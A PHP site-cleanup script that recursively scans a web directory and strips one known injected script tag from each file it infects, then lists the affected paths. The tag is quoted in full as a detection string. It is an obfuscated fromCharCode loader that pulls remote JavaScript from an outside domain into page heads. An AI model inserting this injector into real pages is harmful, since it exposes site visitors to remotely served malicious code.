<?php
	$directory = "./";

	$v = scandir("$directory", 0);

	$big_array  = $v;						

	unset($big_array[0]); 
	unset($big_array[1]); 


	$listed_array = array();

	$find_count = 0;

	function list_elemet($arr, $listed_array, $dir){
		
		global $listed_array;
		foreach($arr as $key => $value){
			if(is_dir($dir . "/" .$value)){
				$new_dir = $dir . "/" . $value;
				$v = scandir($new_dir, 0);
				unset($v[0]); 
				unset($v[1]); 			
				list_elemet($v, $listed_array, $new_dir);
			}else{
				$listed_array[] = $dir . "/" .$value;
								//////CHECK FILE 
									$filetxtc = "";
									$filename = $dir . "/" .$value;
									$myfile = fopen("$filename", "r") or die("Unable to open file!");
					while(!feof($myfile)) {
					 $filetxtc .= fgetc($myfile); ///the file
					}
					global $find_count;					
					if($filename != ".//fix_site.php"){						
							$strs1 = "<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,97,108,108,111,119,46,108,101,116,115,109,97,107,101,112,97,114,116,121,51,46,103,97,47,108,46,106,115,63,100,61,49);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script>";
							
							if(strpos($filetxtc, $strs1)){
								$find_count += 1;
								echo "$find_count. FOUND --- <span style='color:red;'>$filename</span><br />";
								$filetxtc = str_replace($strs1, "", $filetxtc);							
								$myfile = fopen("$filename", "w") or die("Unable to open file!");
								fwrite($myfile, $filetxtc);
							}							
					}
				fclose($myfile); 
							
			}			
		}
		return $listed_array;
	}
	
	$new_listed = list_elemet($big_array, $listed_array, $directory);

	echo "<pre>";
	print_r($new_listed);
	echo "</pre>";

?>
